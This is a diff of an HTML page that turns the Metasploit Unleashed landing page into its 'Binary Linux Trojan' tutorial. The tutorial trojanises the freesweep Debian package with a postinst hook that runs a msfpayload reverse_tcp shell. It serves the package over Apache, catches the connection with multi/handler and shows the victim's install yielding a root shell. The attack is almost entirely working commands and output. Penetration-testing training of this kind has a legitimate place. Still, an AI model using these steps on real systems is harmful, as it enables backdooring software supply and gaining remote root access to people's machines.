@@ -2,7 +2,7 @@
 		<!DOCTYPE html>
 		<html xmlns="" xml:lang="en" lang="en" dir="ltr">
 		<head>
-			<title>Metasploit Unleashed</title>
+			<title>Binary Linux Trojan - Metasploit Unleashed</title>
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/reset.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/style.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/main.css" />
@@ -25,10 +25,10 @@
 						
 						<div id="controls">
 									<ul>
-			<li id="ca-nstab-main" class="selected"><a href="Port_Scanners" title="View the content page [c]" accesskey="c">Page</a></li>
-			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Main_Page&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
-			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
-			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
+			<li id="ca-nstab-main" class="selected"><a href="Binary_Linux_Trojan" title="View the content page [c]" accesskey="c">Page</a></li>
+			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Binary_Linux_Trojan&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
+			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Binary_Linux_Trojan&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
+			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Binary_Linux_Trojan&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
 		</ul>
 							
 							<div class="portlet" id="p-personal">
@@ -57,36 +57,271 @@
 						<a id="top"></a>
 						
 						<div id="content">
-							<h1>Metasploit Unleashed</h1>
+							<h1>Binary Linux Trojan</h1>
 						
 							<div id="siteSub">From Metasploit Unleashed</div>
 							<div id="contentSub"></div>
-																													<div id="jump-to-nav">Jump to: <a href="Port_Scanners#column-one">navigation</a>, <a href="Port_Scanners#searchInput">search</a></div>
+																													<div id="jump-to-nav">Jump to: <a href="Binary_Linux_Trojan#column-one">navigation</a>, <a href="Binary_Linux_Trojan#searchInput">search</a></div>
 														<!-- start content -->
-							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>This free information security training is brought to you in a community effort to promote awareness and raise funds for underprivileged children in East Africa. Through a heart-warming effort by several security professionals, we are proud to present the most complete and in-depth open course about the Metasploit Framework.
+							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>In order to demonstrate that client side attacks and trojans are not exclusive to the Windows world, we will package a Metasploit payload in with an Ubuntu deb package to give us a shell on Linux. An excellent video was made by Redmeat_uk demonstrating this technique that you can view at <a rel="nofollow" class="external free" href="http://securitytube.net/Ubuntu-Package-Backdoor-using-a-Metasploit-Payload-video.aspx">http://securitytube.net/Ubuntu-Package-Backdoor-using-a-Metasploit-Payload-video.aspx</a>
 <br />
+<br />
+We first need to download the package that we are going to infect and move it to a temporary working directory. In our example, we will use the package 'freesweep', a text-based version of Mine Sweeper.
+<br />
+<br />
+<pre><span style='color:#ff0000;'>root@kali</span>:~# <span style='color:#13C16A;'>apt-get --download-only install freesweep</span>
+Reading package lists... Done
+Building dependency tree
+Reading state information... Done
+<span style='color:#00ff00;'>...snip...</span>
+<span style='color:#ff0000;'>root@kali</span>:~# <span style='color:#13C16A;'>mkdir /tmp/evil</span>
+<span style='color:#ff0000;'>root@kali</span>:~# <span style='color:#13C16A;'>mv /var/cache/apt/archives/freesweep_0.90-1_i386.deb /tmp/evil</span>
+<span style='color:#ff0000;'>root@kali</span>:~# <span style='color:#13C16A;'>cd /tmp/evil/</span>
+<span style='color:#ff0000;'>root@kali</span>:/tmp/evil#</pre>
+<br />
+Next, we need to extract the package to a working directory and create a DEBIAN directory to hold our additional added "features".
+<br />
+<br />
+<pre><span style='color:#ff0000;'>root@kali</span>:/tmp/evil# <span style='color:#13C16A;'>dpkg -x freesweep_0.90-1_i386.deb work</span>
+<span style='color:#ff0000;'>root@kali</span>:/tmp/evil# <span style='color:#13C16A;'>mkdir work/DEBIAN</span></pre>
+<br />
+In the 'DEBIAN' directory, create a file named 'control' that contains the following:
+<br />
+<br />
+<pre><span style='color:#ff0000;'>root@kali</span>:/tmp/evil/work/DEBIAN# <span style='color:#13C16A;'>cat control</span>
+Package: freesweep
+Version: 0.90-1
+Section: Games and Amusement
+Priority: optional
+Architecture: i386
+Maintainer: Ubuntu MOTU Developers (ubuntu-motu@lists.ubuntu.com)
+Description: a text-based minesweeper
+Freesweep is an implementation of the popular minesweeper game, where
+one tries to find all the mines without igniting any, based on hints given
+by the computer. Unlike most implementations of this game, Freesweep
+works in any visual text display - in Linux console, in an xterm, and in
+most text-based terminals currently in use.</pre>
+<br />
+We also need to create a post-installation script that will execute our binary. In our 'DEBIAN', we'll create a file named 'postinst' that contains the following:
+<br />
+<br />
+<pre><span style='color:#ff0000;'>root@kali</span>:/tmp/evil/work/DEBIAN# <span style='color:#13C16A;'>cat postinst</span>
+#!/bin/sh
+
+sudo chmod 2755 /usr/games/freesweep_scores &amp;&amp; /usr/games/freesweep_scores &amp; /usr/games/freesweep &amp;</pre>
+<br />
+Now we'll create our malicious payload. We'll be creating a reverse shell to connect back to us named 'freesweep_scores'.
+<br />
+<br />
+<pre><span style='color:#ff0000;'>root@kali</span>:~# <span style='color:#13C16A;'>msfpayload linux/x86/shell/reverse_tcp LHOST=192.168.1.101 LPORT=443 X > /tmp/evil/work/usr/games/freesweep_scores</span>
+Created by msfpayload (http://www.metasploit.com).
+Payload: linux/x86/shell/reverse_tcp
+Length: 50
+Options: LHOST=192.168.1.101,LPORT=443</pre>
+<br />
+We'll now make our post-installation script executable and build our new package. The built file will be named 'work.deb' so we will want to change that to 'freesweep.deb' and copy the package to our web root directory.
+<br />
+<br />
+<pre><span style='color:#ff0000;'>root@kali</span>:/tmp/evil/work/DEBIAN# <span style='color:#13C16A;'>chmod 755 postinst</span>
+<span style='color:#ff0000;'>root@kali</span>:/tmp/evil/work/DEBIAN# <span style='color:#13C16A;'>dpkg-deb --build /tmp/evil/work</span>
+dpkg-deb: building package `freesweep' in `/tmp/evil/work.deb'.
+<span style='color:#ff0000;'>root@kali</span>:/tmp/evil# <span style='color:#13C16A;'>mv work.deb freesweep.deb</span>
+<span style='color:#ff0000;'>root@kali</span>:/tmp/evil# <span style='color:#13C16A;'>cp freesweep.deb /var/www/</span></pre>
+<br />
+If it is not already running, we'll need to start the Apache web server.
+<br />
+<br />
+<pre><span style='color:#ff0000;'>root@kali</span>:/tmp/evil# <span style='color:#13C16A;'>service apache2 start</span></pre>
+<br />
+We will need to set up the Metasploit multi/handler to receive the incoming connection.
+<br />
+<br />
+<pre><span style='color:#ff0000;'>root@kali</span>:~# <span style='color:#13C16A;'>msfcli exploit/multi/handler PAYLOAD=linux/x86/shell/reverse_tcp LHOST=192.168.1.101 LPORT=443 E</span>
+<span style='color:#0000FF;'>[*]</span> Please wait while we load the module tree...
+<span style='color:#0000FF;'>[*]</span> Handler binding to LHOST 0.0.0.0
+<span style='color:#0000FF;'>[*]</span> Started reverse handler
+<span style='color:#0000FF;'>[*]</span> Starting the payload handler...</pre>
+<br />
+On our Ubuntu victim, we have somehow convinced the user to download and install our awesome new game.
+<br />
+<br />
+<pre><span style='color:#ff0000;'>ubuntu@ubuntu</span>:~$ <span style='color:#13C16A;'>wget http://192.168.1.101/freesweep.deb</span>
+
+<span style='color:#ff0000;'>ubuntu@ubuntu</span>:~$ <span style='color:#13C16A;'>sudo dpkg -i freesweep.deb</span></pre>
+<br />
+As the victim installs and plays our game, we have received a shell!
+<br />
+<br />
+<pre><span style='color:#0000FF;'>[*]</span> Sending stage (36 bytes)
+<span style='color:#0000FF;'>[*]</span> Command shell session 1 opened (192.168.1.101:443 -> 192.168.1.175:1129)
+
+<span style='color:#13C16A;'>ifconfig</span>
+eth1 Link encap:Ethernet HWaddr 00:0C:29:C2:E7:E6
+inet addr:192.168.1.175 Bcast:192.168.1.255 Mask:255.255.255.0
+UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1
+RX packets:49 errors:0 dropped:0 overruns:0 frame:0
+TX packets:51 errors:0 dropped:0 overruns:0 carrier:0
+collisions:0 txqueuelen:1000
+RX bytes:43230 (42.2 KiB) TX bytes:4603 (4.4 KiB)
+Interrupt:17 Base address:0x1400
+<span style='color:#00ff00;'>...snip...</span>
+
+<span style='color:#13C16A;'>hostname</span>
+ubuntu
+<span style='color:#13C16A;'>id</span>
+uid=0(root) gid=0(root) groups=0(root)</pre>
 <br />
 </p>
-<div class="center"><div class="floatnone"><a href="File:Msfu_logo_3.png" class="image"><img alt="Msfu logo 3.png" src="http://www.offensive-security.com/w/images/f/f6/Msfu_logo_3.png" width="632" height="319" /></a></div></div>
+<hr />
 <p><br />
-<br />
-This is a free online course and if you enjoy it and find it useful, we ask that you make a donation to the HFC (Hackers For Charity), $9.00 will feed a child for a month, so any contribution is welcome. We hope you enjoy this course as much as we enjoyed making it.
-<br />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total1"><a href="Client_Side_Attacks" title="Client Side Attacks">Client Side Attacks</a> &gt; <a href="Binary_Payloads" title="Binary Payloads">Binary Payloads</a> &gt; Binary Linux Trojan</div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total2"><strong class="selflink">Binary Linux Trojan</strong></div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 </p>
 <!-- 
 NewPP limit report
-Preprocessor visited node count: 6/1000000
-Preprocessor generated node count: 20/1000000
-Post‐expand include size: 0/2097152 bytes
+Preprocessor visited node count: 547/1000000
+Preprocessor generated node count: 2829/1000000
+Post‐expand include size: 3908/2097152 bytes
 Template argument size: 0/2097152 bytes
-Highest expansion depth: 2/40
+Highest expansion depth: 3/40
 Expensive parser function count: 0/100
 -->
 
-<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:285-0!*!*!*!*!2!* and timestamp 20131123153816 -->
+<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:53-0!*!0!*!*!*!* and timestamp 20131123222348 -->
 </div><div class="printfooter">
-Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597">http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597</a>"</div>
-							<div id='catlinks' class='catlinks catlinks-allhidden'></div>							<!-- end content -->
+Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Binary_Linux_Trojan&amp;oldid=1526">http://www.offensive-security.com/w/index.php?title=Binary_Linux_Trojan&amp;oldid=1526</a>"</div>
+							<div id='catlinks' class='catlinks'><div id="mw-normal-catlinks" class="mw-normal-catlinks"><a href="Special:Categories" title="Special:Categories">Category</a>: <ul><li><a href="http://www.offensive-security.com/w/index.php?title=Category:Binary_Payloads&amp;action=edit&amp;redlink=1" class="new" title="Category:Binary Payloads (page does not exist)">Binary Payloads</a></li></ul></div></div>							<!-- end content -->
 													</div>
 						
 					</div>
@@ -521,4 +756,4 @@ document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.
 <script type="text/javascript">
 var pageTracker = _gat._getTracker("UA-1981501-1");
 pageTracker._trackPageview();
-</script><!-- Served in 0.151 secs. --></body></html>
+</script><!-- Served in 0.132 secs. --></body></html>
